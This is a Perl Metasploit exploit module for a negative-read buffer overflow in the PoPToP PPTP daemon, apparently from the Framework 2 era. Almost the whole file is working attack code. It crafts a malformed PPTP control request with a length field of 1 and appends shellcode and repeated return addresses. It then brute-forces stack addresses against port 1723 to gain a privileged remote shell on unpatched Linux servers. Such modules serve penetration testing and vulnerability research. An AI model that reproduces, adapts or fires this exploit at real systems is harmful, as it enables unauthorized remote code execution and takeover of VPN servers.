package Msf::Exploit::PoPToP_Negative_Read;
use strict;
use base 'Msf::Exploit';

my $advanced = {
  'StackTop'    => ['0xbffffa00', 'Start address for stack ret bruteforcing'],
  'StackBottom' => ['0xbffff000', 'End address for stack ret bruteforcing'],
  'StackStep'   => [0, 'Step size for ret bruteforcing, 0 for auto'],
  'BruteWait'   => [.4, 'Length in seconds to wait between brute force attempts'],
    # calculated at 228,  fudge to make more universal
  'PreRetLength'   => [220, 'Space before the we start writing return address.  Note: this will be set to RetLenght + ExtraSpace during use.'],
  'RetLength'      => [32, 'Length of rets after payload'],
  'ExtraSpace'  => [0, "While, this may at first sound like something you may never want to do, it actually isn't really bad at all.  Right now sitting right before our payload is 128 bytes used for the Hostname and Vendor name, the reason I am leaving this intact is because someday I'd like to have the packets look like they came from a real client (ie windows).  If you use this option (say, set it to 128), it will give you 128 more bytes, starting the payload in this space."],
};

my $info = {
  'Name'  => 'PoPToP Negative Read Overflow',
  'Version'  => '$Revision$',
  'Author'  => 'spoonm <ninjatools [at] hush.com>',
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'linux' ],
  'Priv'  => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 1723],
    },
  'Payload' =>
    {
      'Space'     => 0, # We need to set this in new, since its user configurable
      'BadChars'  => "", # Eh, we don't have any
      'PrependEncoder'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
      'MinNops'   => 16,
    },
  'Description'  =>  
        'PoPToP Negative Read Buffer Overflow affecting '.
        'versions prior to 1.1.4-b3 and 1.1.3-20030409. '.
        'The daemon forks, so we can hit as many times as '.
        'we need to. However, you can only hold 4 concurrent '.
        'processes (so 4 concurrent connectbacks and you won\'t hit anyore '.
        'until you free one). It does a fork() and then exec() so '.
        'so the stack should be pretty similar each attempt. '.
        'We can only fit about 200 bytes of shellcode',
  'Refs'  =>
    [
      'http://www.osvdb.org/displayvuln.php?osvdb_id=3293',
      'http://securityfocus.com/archive/1/317995',
      'http://www.freewebs.com/blightninjas/',
    ],
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  # Deal with ExtraSpace
  $self->SetLocal('ExtraSpace', 128) if($self->GetLocal('ExtraSpace') > 128);
  $self->SetLocal('PreRetLength', $self->GetLocal('PreRetLength') + $self->GetLocal('ExtraSpace'));

  return($self);
}

# Override the PayloadSpace method
sub PayloadSpace {
  my $self = shift;
  return($self->GetLocal('PreRetLength'));
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  # struct pptp_header {
  #   u_int16_t length;               /* pptp message length incl header */
  #   u_int16_t pptp_type;            /* pptp message type */
  #   u_int32_t magic;                /* magic cookie */
  #   u_int16_t ctrl_type;            /* control message type */
  #   u_int16_t reserved0;            /* reserved */
  # };
  my $headerPayload =
    "\x00\x01" . # Length (1) ;)
    "\x00\x01" . # PPTP Type (PPTP_CTRL_MESSAGE -> 1)
    #fixme this should be randomized, along with a lot of the other values.
    "\x1a\x2b\x3c\x4d" . # No more no less, that's a magic number (0x1a2b3c4d)
    "\x00\x01" . # Ctrl Type (START_CTRL_CONN_RQST -> 1)
    "\x00\x00";  # Reserved (0)


  my $hostnameSize = 64;
  my $vendorSize = 64 - $self->GetLocal('ExtraSpace');
  $hostnameSize += $vendorSize if($vendorSize < 0);

  $self->PrintDebugLine(1, "ExtraSpace: " . $self->GetLocal('ExtraSpace'));
  $self->PrintDebugLine(1, "Hostname Size: $hostnameSize");
  $self->PrintDebugLine(1, "Vendor Size: $vendorSize");

  # MAX_HOSTNAME_SIZE  64
  # MAX_VENDOR_SIZE    64
  # struct pptp_start_ctrl_conn_rqst {
  #   struct pptp_header header;      /* pptp header */
  #   u_int16_t version;              /* pptp protocol version */
  #   u_int16_t reserved1;            /* reserved */
  #   u_int32_t framing_cap;          /* framing capabilities */
  #   u_int32_t bearer_cap;           /* bearer capabilities */
  #   u_int16_t max_channels;         /* maximum channels */
  #   u_int16_t firmware_rev;         /* firmware revision */
  #   u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */
  #   u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */
  # };
  my $ctrlPayload =
    "\x01\x00" . # Version (1.0)
    "\x00\x00" . # Reserved (0)
    "\x00\x00\x00\x00" . # Framing Cap (0)
    "\x00\x00\x00\x00" . # Bearer Cap (0)
    "\x00\x01" . # Max Channels (1)
    "\x00\x01" . # Firmware Rev (1)
    Pex::Utils::PadBuffer('drawesome', $hostnameSize) . # Hostname
    Pex::Utils::PadBuffer('drawesome', $vendorSize);  # Vendor


  my $retLength = $self->GetLocal('RetLength');
  my $bruteWait = $self->GetLocal('BruteWait');
  my $stackTop = hex($self->GetLocal('StackTop'));
  my $stackBottom = hex($self->GetLocal('StackBottom'));

  my $stackStep = $self->GetLocal('StackStep');
  $stackStep = $encodedPayload->NopsLength if($stackStep == 0);
  $stackStep -= $stackStep % 4;

  for(my $ret = $stackTop; $ret >= $stackBottom; $ret -= $stackStep) {
    my $sock = Msf::Socket->new();
    if(!$sock->tcp($targetHost, $targetPort)) {
      $self->FatalError($sock->get_error);
      return;
    }

    $self->PrintLine(sprintf("Trying %#08x", $ret));

    $sock->send($headerPayload . $ctrlPayload . $shellcode . (pack('l', $ret) x int($retLength / 4)));
    $sock->close;
    select(undef, undef, undef, $bruteWait); # ghetto sleep
  }
  exit(0);
}

1;
